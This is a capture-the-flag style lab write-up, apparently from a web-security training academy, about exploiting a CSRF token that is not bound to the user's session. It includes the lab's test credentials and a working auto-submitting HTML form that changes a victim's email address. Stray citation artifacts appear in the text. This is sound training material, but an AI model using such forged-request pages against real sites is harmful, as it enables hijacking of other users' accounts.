## CSRF where token is not tied to user session

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

The lab title suggests that the CSRF token is **not tied to the user session**.

Normally, a CSRF token should only work for the session that generated it.  
Here, the application only checks if the token is valid globally, not if it belongs to the current user session. :contentReference[oaicite:0]{index=0}

That means we can reuse our own CSRF token inside a malicious HTML page and force another authenticated user to submit the request.

Generate a CSRF PoC with Burp Suite :

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4e004b03eefe718147343e00150067.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@labs.com" />
      <input type="hidden" name="csrf" value="rrxJjjg0TJIpROFcLZ1kGKhvPWXVOOn3" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Host the payload on the **Exploit Server** and deliver it to the victim.

Even though the victim has a completely different session cookie, the request is accepted because the CSRF token is not bound to the user session. :contentReference[oaicite:1]{index=1}
